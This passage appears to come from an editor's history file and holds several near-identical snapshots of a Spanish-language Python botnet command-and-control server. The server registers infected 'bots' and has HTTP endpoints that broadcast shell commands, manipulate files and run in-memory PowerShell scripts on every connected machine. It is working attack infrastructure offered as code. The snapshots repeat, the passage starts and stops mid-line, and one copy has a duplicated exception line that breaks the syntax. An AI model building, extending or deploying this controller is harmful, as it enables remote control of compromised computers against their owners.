datetime.now().isoformat()\r\n+            }\r\n+        )\r\n+        \r\n+        logging.info(f\"Bot {bot_id} registrado en DB con ID {db_bot_id}\")\r\n+        \r\n+        # Agregar a las estructuras en memoria\r\n+        sistemas_operativos[conn] = sistema\r\n+        bots.append(conn)\r\n+        bot_ids[conn] = bot_id\r\n+        \r\n+        # Procesar comandos pendientes\r\n+        pending_commands = db.get_pending_commands(db_bot_id)\r\n+        for cmd in pending_commands:\r\n+            try:\r\n+                conn.send(cmd['command'].encode(\"utf-8\"))\r\n+                # Esperar respuesta\r\n+                response = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if response:\r\n+                    db.store_response(db_bot_id, cmd['command'], response)\r\n+                db.mark_command_executed(cmd['id'])\r\n+            except:\r\n+                continue\r\n+        \r\n+        # Bucle principal de comunicaci√≥n\r\n+        while True:\r\n+            try:\r\n+                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if not data:\r\n+                    break\r\n+                    \r\n+                # Almacenar respuesta en la base de datos\r\n+                db.store_response(db_bot_id, \"unknown\", data)\r\n+                respuestas_bots[bot_id] = data\r\n+                \r\n+            except:\r\n+                break\r\n+                \r\n+    except Exception as e:\r\n+        logging.error(f\"Error con bot {bot_id}: {e}\")\r\n+    finally:\r\n+        # Marcar bot como inactivo en la base de datos\r\n+        try:\r\n+            db.mark_bot_inactive(db_bot_id)\r\n+        except:\r\n+            pass\r\n+            \r\n+        conn.close()\r\n+        if conn in bots:\r\n+            bots.remove(conn)\r\n+        if conn in bot_ids:\r\n+            del bot_ids[conn]\r\n+        if conn in sistemas_operativos:\r\n+            del sistemas_operativos[conn]\r\n+\r\n+@app.route('/listar_bots', methods=['GET'])\r\n+def listar_bots():\r\n+    \"\"\"Lista todos los bots conectados.\"\"\"\r\n+    try:\r\n+        active_bots = db.get_active_bots() if db else []\r\n+        if active_bots:\r\n+            return jsonify([{\r\n+                \"id\": bot[\"id\"],\r\n+                \"so\": json.loads(bot[\"system_info\"]).get(\"os\", \"Unknown\"),  # Extraer OS del JSON\r\n+                \"ip\": bot[\"ip_address\"],\r\n+                \"hostname\": json.loads(bot[\"system_info\"]).get(\"hostname\", f\"bot_{bot['id']}\"),  # Extraer hostname del JSON\r\n+                \"last_seen\": bot[\"last_seen\"]\r\n+            } for bot in active_bots])\r\n+        return jsonify({\"message\": \"No hay bots conectados.\"})\r\n+    except Exception as e:\r\n+    except Exception as e:\r\n+        app.logger.error(f\"Error en listar_bots: {str(e)}\")\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/enviar_comando', methods=['POST'])\r\n+def enviar_comando():\r\n+    \"\"\"Env√≠a comandos a los bots.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        if not data:\r\n+            return jsonify({\"error\": \"No se recibieron datos\"}), 400\r\n+            \r\n+        if not bots:\r\n+            return jsonify({\"message\": \"No hay bots conectados.\"})\r\n+\r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            try:\r\n+                if bot not in sistemas_operativos:\r\n+                    app.logger.warning(f\"Bot sin sistema operativo detectado\")\r\n+                    continue\r\n+                    \r\n+                comando = data.get(\"comando_windows\") if sistemas_operativos[bot] == \"windows\" else data.get(\"comando_linux\")\r\n+                if not comando:\r\n+                    continue\r\n+                    \r\n+                bot.send(comando.encode(\"utf-8\"))\r\n+                bot_id = bot_ids.get(bot)\r\n+                if not bot_id:\r\n+                    continue\r\n+                \r\n+                # Esperar respuesta con timeout\r\n+                tiempo_inicio = time.time()\r\n+                while time.time() - tiempo_inicio < 5:\r\n+                    if bot_id in respuestas_bots:\r\n+                        respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                        break\r\n+                    time.sleep(0.1)\r\n+            except Exception as e:\r\n+                app.logger.error(f\"Error enviando comando a bot {bot_ids.get(bot)}: {str(e)}\")\r\n+                continue\r\n+\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        app.logger.error(f\"Error en enviar_comando: {str(e)}\")\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/shutdown', methods=['POST'])\r\n+def shutdown():\r\n+    \"\"\"Apaga el servidor y desconecta todos los bots.\"\"\"\r\n+    global server_running\r\n+    try:\r\n+        server_running = False\r\n+        for bot in bots[:]:\r\n+            try:\r\n+                bot.send(\"shutdown\".encode(\"utf-8\"))\r\n+                bot.close()\r\n+            except:\r\n+                pass\r\n+        bots.clear()\r\n+        bot_ids.clear()\r\n+        sistemas_operativos.clear()\r\n+        respuestas_bots.clear()\r\n+        return jsonify({\"message\": \"Servidor apagado correctamente\"})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+from modules.basic_commands import *\r\n+from modules.file_operations import *\r\n+from modules.advanced_execution import *\r\n+\r\n+# Nuevos endpoints despu√©s de los existentes\r\n+@app.route('/execute_command', methods=['POST'])\r\n+def execute_system_command_endpoint():\r\n+    \"\"\"Ejecuta un comando del sistema en los bots seleccionados.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        command = data.get('command')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    bot.send(f\"cmd:{command}\".encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/file_operations', methods=['POST'])\r\n+def file_operations_endpoint():\r\n+    \"\"\"Maneja operaciones con archivos.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        operation = data.get('operation')\r\n+        path = data.get('path')\r\n+        file_data = data.get('file_data')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    cmd = f\"file:{operation}:{path}\"\r\n+                    if file_data:\r\n+                        cmd += f\":{file_data}\"\r\n+                    bot.send(cmd.encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/execute_script', methods=['POST'])\r\n+def execute_script_endpoint():\r\n+    \"\"\"Ejecuta scripts en memoria.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        script = data.get('script')\r\n+        script_type = data.get('type', 'powershell')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    cmd = f\"script:{script_type}:{script}\"\r\n+                    bot.send(cmd.encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+def iniciar_servidor_cnc():\r\n+    \"\"\"Inicia el servidor CnC.\"\"\"\r\n+    global server_running\r\n+    try:\r\n+        config = cargar_configuracion()\r\n+        if not config:\r\n+            raise ValueError(\"No se pudo cargar la configuraci√≥n\")\r\n+            \r\n+        configurar_logging(config)\r\n+        \r\n+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+        host = config.get(\"NETWORK\", \"HOST\", fallback=\"127.0.0.1\")\r\n+        port = config.getint(\"NETWORK\", \"PORT\", fallback=5001)\r\n+        \r\n+        server.bind((host, port))\r\n+        server.listen(5)\r\n+        server.settimeout(1)\r\n+        \r\n+        print(f\"[+] Servidor CnC escuchando en {host}:{port}\")\r\n+        \r\n+        def accept_wrapper():\r\n+            next_bot_id = 1\r\n+            while server_running:\r\n+                try:\r\n+                    conn, addr = server.accept()\r\n+                    threading.Thread(target=manejar_bot, args=(conn, addr, next_bot_id)).start()\r\n+                    next_bot_id += 1\r\n+                except socket.timeout:\r\n+                    continue\r\n+                except Exception as e:\r\n+                    if server_running:\r\n+                        app.logger.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+        \r\n+        threading.Thread(target=accept_wrapper, daemon=True).start()\r\n+        return True\r\n+        \r\n+    except Exception as e:\r\n+        app.logger.error(f\"Error iniciando servidor CnC: {e}\")\r\n+        return False\r\n+\r\n+# Configurar logging m√°s detallado\r\n+app.logger.setLevel(logging.DEBUG)\r\n+handler = logging.FileHandler(os.path.join(os.path.dirname(__file__), \"..\", \"logs\", \"flask_debug.log\"))\r\n+handler.setLevel(logging.DEBUG)\r\n+app.logger.addHandler(handler)\r\n+\r\n+@app.errorhandler(500)\r\n+def handle_500_error(e):\r\n+    app.logger.error(f'Error interno del servidor: {str(e)}')\r\n+    return jsonify({\r\n+        \"error\": \"Error interno del servidor\",\r\n+        \"details\": str(e)\r\n+    }), 500\r\n+\r\n+if __name__ == \"__main__\":\r\n+    try:\r\n+        print(\"[*] Iniciando servidor C&C...\")\r\n+        if iniciar_servidor_cnc():\r\n+            print(\"[+] Servidor C&C iniciado correctamente\")\r\n+            print(\"[*] Iniciando servidor web...\")\r\n+            config = cargar_configuracion()\r\n+            api_port = config.getint(\"NETWORK\", \"API_PORT\", fallback=5000)\r\n+            print(f\"[*] Servidor web escuchando en http://127.0.0.1:{api_port}\")\r\n+            \r\n+            # Configurar Flask para producci√≥n\r\n+            app.config['ENV'] = 'production'\r\n+            app.config['DEBUG'] = False\r\n+            \r\n+            # Iniciar Flask\r\n+            app.run(\r\n+                host=\"127.0.0.1\", \r\n+                port=api_port, \r\n+                debug=False, \r\n+                use_reloader=False,\r\n+                threaded=True\r\n+            )\r\n+        else:\r\n+            print(\"[-] Error al iniciar el servidor C&C\")\r\n+            sys.exit(1)\r\n+    except Exception as e:\r\n+        print(f\"[-] Error cr√≠tico: {e}\")\r\n+        sys.exit(1)\r\n"
                },
                {
                    "date": 1740304536014,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,396 @@\n+from datetime import datetime\r\n+from flask import Flask, jsonify, request\r\n+import logging\r\n+import socket\r\n+import sys\r\n+import threading\r\n+import time\r\n+import os\r\n+import ipaddress\r\n+import sqlite3\r\n+import configparser\r\n+\r\n+app = Flask(__name__)\r\n+\r\n+# Variables globales\r\n+bots = []\r\n+bot_ids = {}\r\n+sistemas_operativos = {}\r\n+respuestas_bots = {}\r\n+server_running = True\r\n+\r\n+def cargar_configuracion():\r\n+    \"\"\"Carga la configuraci√≥n del servidor.\"\"\"\r\n+    config = configparser.ConfigParser()\r\n+    config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config.ini\"))\r\n+    return config\r\n+\r\n+def configurar_logging(config):\r\n+    \"\"\"Configura el sistema de logging.\"\"\"\r\n+    log_path = os.path.join(os.path.dirname(__file__), \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n+    os.makedirs(os.path.dirname(log_path), exist_ok=True)\r\n+    \r\n+    logging.basicConfig(\r\n+        level=logging.INFO,\r\n+        format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n+        handlers=[\r\n+            logging.FileHandler(log_path, encoding=\"utf-8\"),\r\n+            logging.StreamHandler()\r\n+        ]\r\n+    )\r\n+\r\n+def aceptar_conexiones(server):\r\n+    \"\"\"Acepta conexiones de bots.\"\"\"\r\n+    global server_running\r\n+    bot_id = 1\r\n+    while server_running:\r\n+        try:\r\n+            conn, addr = server.accept()\r\n+            bots.append(conn)\r\n+            bot_ids[conn] = bot_id\r\n+            threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()\r\n+            bot_id += 1\r\n+        except socket.timeout:\r\n+            continue\r\n+        except Exception as e:\r\n+            if server_running:\r\n+                logging.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+\r\n+from modules.database_manager import DatabaseManager\r\n+\r\n+# Inicializar el gestor de base de datos\r\n+db = DatabaseManager()  # Ya no pasamos la ruta, usar√° la predeterminada\r\n+\r\n+def manejar_bot(conn, addr, bot_id):\r\n+    \"\"\"Maneja la conexi√≥n con un bot.\"\"\"\r\n+    try:\r\n+        # Esperar identificaci√≥n del bot\r\n+        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n+        if not identificador:\r\n+            conn.close()\r\n+            return\r\n+            \r\n+        # Detectar sistema operativo\r\n+        conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+        os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+        sistema = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+        \r\n+        # Registrar o actualizar bot en la base de datos usando los par√°metros correctos\r\n+        db_bot_id = db.register_bot(\r\n+            unique_id=identificador,\r\n+            ip_address=addr[0],\r\n+            system_info={\"os\": sistema, \"full_info\": os_info},\r\n+            hostname=f\"bot_{bot_id}\",\r\n+            additional_info={\r\n+                \"port\": addr[1],\r\n+                \"connection_time\": datetime.now().isoformat()\r\n+            }\r\n+        )\r\n+        \r\n+        logging.info(f\"Bot {bot_id} registrado en DB con ID {db_bot_id}\")\r\n+        \r\n+        # Agregar a las estructuras en memoria\r\n+        sistemas_operativos[conn] = sistema\r\n+        bots.append(conn)\r\n+        bot_ids[conn] = bot_id\r\n+        \r\n+        # Procesar comandos pendientes\r\n+        pending_commands = db.get_pending_commands(db_bot_id)\r\n+        for cmd in pending_commands:\r\n+            try:\r\n+                conn.send(cmd['command'].encode(\"utf-8\"))\r\n+                # Esperar respuesta\r\n+                response = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if response:\r\n+                    db.store_response(db_bot_id, cmd['command'], response)\r\n+                db.mark_command_executed(cmd['id'])\r\n+            except:\r\n+                continue\r\n+        \r\n+        # Bucle principal de comunicaci√≥n\r\n+        while True:\r\n+            try:\r\n+                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if not data:\r\n+                    break\r\n+                    \r\n+                # Almacenar respuesta en la base de datos\r\n+                db.store_response(db_bot_id, \"unknown\", data)\r\n+                respuestas_bots[bot_id] = data\r\n+                \r\n+            except:\r\n+                break\r\n+                \r\n+    except Exception as e:\r\n+        logging.error(f\"Error con bot {bot_id}: {e}\")\r\n+    finally:\r\n+        # Marcar bot como inactivo en la base de datos\r\n+        try:\r\n+            db.mark_bot_inactive(db_bot_id)\r\n+        except:\r\n+            pass\r\n+            \r\n+        conn.close()\r\n+        if conn in bots:\r\n+            bots.remove(conn)\r\n+        if conn in bot_ids:\r\n+            del bot_ids[conn]\r\n+        if conn in sistemas_operativos:\r\n+            del sistemas_operativos[conn]\r\n+\r\n+@app.route('/listar_bots', methods=['GET'])\r\n+def listar_bots():\r\n+    \"\"\"Lista todos los bots conectados.\"\"\"\r\n+    try:\r\n+        active_bots = db.get_active_bots() if db else []\r\n+        if active_bots:\r\n+            return jsonify([{\r\n+                \"id\": bot[\"id\"],\r\n+                \"so\": json.loads(bot[\"system_info\"]).get(\"os\", \"Unknown\"),  # Extraer OS del JSON\r\n+                \"ip\": bot[\"ip_address\"],\r\n+                \"hostname\": json.loads(bot[\"system_info\"]).get(\"hostname\", f\"bot_{bot['id']}\"),  # Extraer hostname del JSON\r\n+                \"last_seen\": bot[\"last_seen\"]\r\n+            } for bot in active_bots])\r\n+        return jsonify({\"message\": \"No hay bots conectados.\"})\r\n+    except Exception as e:\r\n+        app.logger.error(f\"Error en listar_bots: {str(e)}\")\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/enviar_comando', methods=['POST'])\r\n+def enviar_comando():\r\n+    \"\"\"Env√≠a comandos a los bots.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        if not data:\r\n+            return jsonify({\"error\": \"No se recibieron datos\"}), 400\r\n+            \r\n+        if not bots:\r\n+            return jsonify({\"message\": \"No hay bots conectados.\"})\r\n+\r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            try:\r\n+                if bot not in sistemas_operativos:\r\n+                    app.logger.warning(f\"Bot sin sistema operativo detectado\")\r\n+                    continue\r\n+                    \r\n+                comando = data.get(\"comando_windows\") if sistemas_operativos[bot] == \"windows\" else data.get(\"comando_linux\")\r\n+                if not comando:\r\n+                    continue\r\n+                    \r\n+                bot.send(comando.encode(\"utf-8\"))\r\n+                bot_id = bot_ids.get(bot)\r\n+                if not bot_id:\r\n+                    continue\r\n+                \r\n+                # Esperar respuesta con timeout\r\n+                tiempo_inicio = time.time()\r\n+                while time.time() - tiempo_inicio < 5:\r\n+                    if bot_id in respuestas_bots:\r\n+                        respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                        break\r\n+                    time.sleep(0.1)\r\n+            except Exception as e:\r\n+                app.logger.error(f\"Error enviando comando a bot {bot_ids.get(bot)}: {str(e)}\")\r\n+                continue\r\n+\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        app.logger.error(f\"Error en enviar_comando: {str(e)}\")\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/shutdown', methods=['POST'])\r\n+def shutdown():\r\n+    \"\"\"Apaga el servidor y desconecta todos los bots.\"\"\"\r\n+    global server_running\r\n+    try:\r\n+        server_running = False\r\n+        for bot in bots[:]:\r\n+            try:\r\n+                bot.send(\"shutdown\".encode(\"utf-8\"))\r\n+                bot.close()\r\n+            except:\r\n+                pass\r\n+        bots.clear()\r\n+        bot_ids.clear()\r\n+        sistemas_operativos.clear()\r\n+        respuestas_bots.clear()\r\n+        return jsonify({\"message\": \"Servidor apagado correctamente\"})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+from modules.basic_commands import *\r\n+from modules.file_operations import *\r\n+from modules.advanced_execution import *\r\n+\r\n+# Nuevos endpoints despu√©s de los existentes\r\n+@app.route('/execute_command', methods=['POST'])\r\n+def execute_system_command_endpoint():\r\n+    \"\"\"Ejecuta un comando del sistema en los bots seleccionados.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        command = data.get('command')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    bot.send(f\"cmd:{command}\".encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/file_operations', methods=['POST'])\r\n+def file_operations_endpoint():\r\n+    \"\"\"Maneja operaciones con archivos.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        operation = data.get('operation')\r\n+        path = data.get('path')\r\n+        file_data = data.get('file_data')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    cmd = f\"file:{operation}:{path}\"\r\n+                    if file_data:\r\n+                        cmd += f\":{file_data}\"\r\n+                    bot.send(cmd.encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/execute_script', methods=['POST'])\r\n+def execute_script_endpoint():\r\n+    \"\"\"Ejecuta scripts en memoria.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        script = data.get('script')\r\n+        script_type = data.get('type', 'powershell')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    cmd = f\"script:{script_type}:{script}\"\r\n+                    bot.send(cmd.encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+def iniciar_servidor_cnc():\r\n+    \"\"\"Inicia el servidor CnC.\"\"\"\r\n+    global server_running\r\n+    try:\r\n+        config = cargar_configuracion()\r\n+        if not config:\r\n+            raise ValueError(\"No se pudo cargar la configuraci√≥n\")\r\n+            \r\n+        configurar_logging(config)\r\n+        \r\n+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+        host = config.get(\"NETWORK\", \"HOST\", fallback=\"127.0.0.1\")\r\n+        port = config.getint(\"NETWORK\", \"PORT\", fallback=5001)\r\n+        \r\n+        server.bind((host, port))\r\n+        server.listen(5)\r\n+        server.settimeout(1)\r\n+        \r\n+        print(f\"[+] Servidor CnC escuchando en {host}:{port}\")\r\n+        \r\n+        def accept_wrapper():\r\n+            next_bot_id = 1\r\n+            while server_running:\r\n+                try:\r\n+                    conn, addr = server.accept()\r\n+                    threading.Thread(target=manejar_bot, args=(conn, addr, next_bot_id)).start()\r\n+                    next_bot_id += 1\r\n+                except socket.timeout:\r\n+                    continue\r\n+                except Exception as e:\r\n+                    if server_running:\r\n+                        app.logger.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+        \r\n+        threading.Thread(target=accept_wrapper, daemon=True).start()\r\n+        return True\r\n+        \r\n+    except Exception as e:\r\n+        app.logger.error(f\"Error iniciando servidor CnC: {e}\")\r\n+        return False\r\n+\r\n+# Configurar logging m√°s detallado\r\n+app.logger.setLevel(logging.DEBUG)\r\n+handler = logging.FileHandler(os.path.join(os.path.dirname(__file__), \"..\", \"logs\", \"flask_debug.log\"))\r\n+handler.setLevel(logging.DEBUG)\r\n+app.logger.addHandler(handler)\r\n+\r\n+@app.errorhandler(500)\r\n+def handle_500_error(e):\r\n+    app.logger.error(f'Error interno del servidor: {str(e)}')\r\n+    return jsonify({\r\n+        \"error\": \"Error interno del servidor\",\r\n+        \"details\": str(e)\r\n+    }), 500\r\n+\r\n+if __name__ == \"__main__\":\r\n+    try:\r\n+        print(\"[*] Iniciando servidor C&C...\")\r\n+        if iniciar_servidor_cnc():\r\n+            print(\"[+] Servidor C&C iniciado correctamente\")\r\n+            print(\"[*] Iniciando servidor web...\")\r\n+            config = cargar_configuracion()\r\n+            api_port = config.getint(\"NETWORK\", \"API_PORT\", fallback=5000)\r\n+            print(f\"[*] Servidor web escuchando en http://127.0.0.1:{api_port}\")\r\n+            \r\n+            # Configurar Flask para producci√≥n\r\n+            app.config['ENV'] = 'production'\r\n+            app.config['DEBUG'] = False\r\n+            \r\n+            # Iniciar Flask\r\n+            app.run(\r\n+                host=\"127.0.0.1\", \r\n+                port=api_port, \r\n+                debug=False, \r\n+                use_reloader=False,\r\n+                threaded=True\r\n+            )\r\n+        else:\r\n+            print(\"[-] Error al iniciar el servidor C&C\")\r\n+            sys.exit(1)\r\n+    except Exception as e:\r\n+        print(f\"[-] Error cr√≠tico: {e}\")\r\n+        sys.exit(1)\r\n"
                },
                {
                    "date": 1740304543086,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,396 @@\n+from datetime import datetime\r\n+from flask import Flask, jsonify, request\r\n+import logging\r\n+import socket\r\n+import sys\r\n+import threading\r\n+import time\r\n+import os\r\n+import ipaddress\r\n+import sqlite3\r\n+import configparser\r\n+\r\n+app = Flask(__name__)\r\n+\r\n+# Variables globales\r\n+bots = []\r\n+bot_ids = {}\r\n+sistemas_operativos = {}\r\n+respuestas_bots = {}\r\n+server_running = True\r\n+\r\n+def cargar_configuracion():\r\n+    \"\"\"Carga la configuraci√≥n del servidor.\"\"\"\r\n+    config = configparser.ConfigParser()\r\n+    config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config.ini\"))\r\n+    return config\r\n+\r\n+def configurar_logging(config):\r\n+    \"\"\"Configura el sistema de logging.\"\"\"\r\n+    log_path = os.path.join(os.path.dirname(__file__), \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n+    os.makedirs(os.path.dirname(log_path), exist_ok=True)\r\n+    \r\n+    logging.basicConfig(\r\n+        level=logging.INFO,\r\n+        format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n+        handlers=[\r\n+            logging.FileHandler(log_path, encoding=\"utf-8\"),\r\n+            logging.StreamHandler()\r\n+        ]\r\n+    )\r\n+\r\n+def aceptar_conexiones(server):\r\n+    \"\"\"Acepta conexiones de bots.\"\"\"\r\n+    global server_running\r\n+    bot_id = 1\r\n+    while server_running:\r\n+        try:\r\n+            conn, addr = server.accept()\r\n+            bots.append(conn)\r\n+            bot_ids[conn] = bot_id\r\n+            threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()\r\n+            bot_id += 1\r\n+        except socket.timeout:\r\n+            continue\r\n+        except Exception as e:\r\n+            if server_running:\r\n+                logging.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+\r\n+from modules.database_manager import DatabaseManager\r\n+\r\n+# Inicializar el gestor de base de datos\r\n+db = DatabaseManager()  # Ya no pasamos la ruta, usar√° la predeterminada\r\n+\r\n+def manejar_bot(conn, addr, bot_id):\r\n+    \"\"\"Maneja la conexi√≥n con un bot.\"\"\"\r\n+    try:\r\n+        # Esperar identificaci√≥n del bot\r\n+        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n+        if not identificador:\r\n+            conn.close()\r\n+            return\r\n+            \r\n+        # Detectar sistema operativo\r\n+        conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+        os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+        sistema = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+        \r\n+        # Registrar o actualizar bot en la base de datos usando los par√°metros correctos\r\n+        db_bot_id = db.register_bot(\r\n+            unique_id=identificador,\r\n+            ip_address=addr[0],\r\n+            system_info={\"os\": sistema, \"full_info\": os_info},\r\n+            hostname=f\"bot_{bot_id}\",\r\n+            additional_info={\r\n+                \"port\": addr[1],\r\n+                \"connection_time\": datetime.now().isoformat()\r\n+            }\r\n+        )\r\n+        \r\n+        logging.info(f\"Bot {bot_id} registrado en DB con ID {db_bot_id}\")\r\n+        \r\n+        # Agregar a las estructuras en memoria\r\n+        sistemas_operativos[conn] = sistema\r\n+        bots.append(conn)\r\n+        bot_ids[conn] = bot_id\r\n+        \r\n+        # Procesar comandos pendientes\r\n+        pending_commands = db.get_pending_commands(db_bot_id)\r\n+        for cmd in pending_commands:\r\n+            try:\r\n+                conn.send(cmd['command'].encode(\"utf-8\"))\r\n+                # Esperar respuesta\r\n+                response = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if response:\r\n+                    db.store_response(db_bot_id, cmd['command'], response)\r\n+                db.mark_command_executed(cmd['id'])\r\n+            except:\r\n+                continue\r\n+        \r\n+        # Bucle principal de comunicaci√≥n\r\n+        while True:\r\n+            try:\r\n+                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if not data:\r\n+                    break\r\n+                    \r\n+                # Almacenar respuesta en la base de datos\r\n+                db.store_response(db_bot_id, \"unknown\", data)\r\n+                respuestas_bots[bot_id] = data\r\n+                \r\n+            except:\r\n+                break\r\n+                \r\n+    except Exception as e:\r\n+        logging.error(f\"Error con bot {bot_id}: {e}\")\r\n+    finally:\r\n+        # Marcar bot como inactivo en la base de datos\r\n+        try:\r\n+            db.mark_bot_inactive(db_bot_id)\r\n+        except:\r\n+            pass\r\n+            \r\n+        conn.close()\r\n+        if conn in bots:\r\n+            bots.remove(conn)\r\n+        if conn in bot_ids:\r\n+            del bot_ids[conn]\r\n+        if conn in sistemas_operativos:\r\n+            del 